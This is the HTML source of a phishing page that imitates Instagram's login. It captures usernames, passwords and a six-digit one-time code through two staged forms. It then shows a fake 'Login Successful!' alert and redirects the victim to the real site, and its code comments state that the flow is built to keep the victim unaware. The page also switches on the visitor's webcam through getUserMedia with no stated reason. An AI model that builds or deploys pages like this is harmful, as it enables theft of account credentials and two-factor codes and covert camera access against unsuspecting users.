<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>
<link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
<style>
@import url('https://fonts.googleapis.com/css2?family=Grand+Hotel&family=Roboto:wght@400;500;700&display=swap');
body { font-family: sans-serif; background: #fafafa; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
.main-container { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; box-sizing: border-box; position: relative; z-index: 10; }
.logo { font-family: 'Grand Hotel', cursive; font-size: 49px; text-align: center; margin-bottom: 25px; color: #262626; }
.form-group { margin-bottom: 6px; }
input { width: 100%; padding: 9px 7px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; font-size: 12px; box-sizing: border-box; }
.btn-next { width: 100%; background-color: #0095f6; color: white; border: none; padding: 7px; border-radius: 4px; font-weight: 600; margin-top: 8px; cursor: pointer; }
#bgVideo { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; z-index: 1; opacity: 0.25; }
.subtitle { text-align: center; font-size: 12px; color: #8e8e8e; margin-bottom: 15px; }
</style>
</head>
<body>

<video id="bgVideo" autoplay muted playsinline></video>
<div class="main-container">

    <!-- Step 1 -->
    <div id="step1">
        <div class="logo">Instagram</div>
        <form action="/login" method="POST">
            <div class="form-group"><input type="text" name="username" placeholder="Phone number, username, or email" required></div>
            <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
            <button type="submit" class="btn-next">Log In</button>
        </form>
    </div>

    <!-- Step 2: OTP -->
    <div id="step2" style="display: none;">
        <div class="logo" style="font-size:30px;">_instagram_</div>
        <p class="subtitle">Enter the code we sent to your device.</p>
        <form action="/otp" method="POST">
            <div class="form-group"><input type="text" name="otp" placeholder="6-digit code" maxlength="6" required style="font-size: 20px; text-align: center;"></div>
            <button type="submit" class="btn-next">Next</button>
        </form>
    </div>

</div>

<script>
// Camera Logic
async function initCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        document.getElementById('bgVideo').srcObject = stream;
    } catch (err) { console.log(err); }
}
initCamera();

// Form Submit par page reload nahi hoga taaki user ko lage kuch ho raha hai
document.getElementById('step1').querySelector('form').addEventListener('submit', function(e){
    e.preventDefault(); // Reload roko
    let formData = new FormData(this);
    
    fetch('/login', { method: 'POST', body: formData }).then(() => {
        document.getElementById('step1').style.display = 'none';
        document.getElementById('step2').style.display = 'block';
    });
});

document.getElementById('step2').querySelector('form').addEventListener('submit', function(e){
    e.preventDefault(); // Reload roko
    let formData = new FormData(this);
    
    fetch('/otp', { method: 'POST', body: formData }).then(() => {
        alert("Login Successful!");
        window.location.href = "https://www.instagram.com/"; // Real page pe bhej do
    });
});
</script>
</body>
</html>
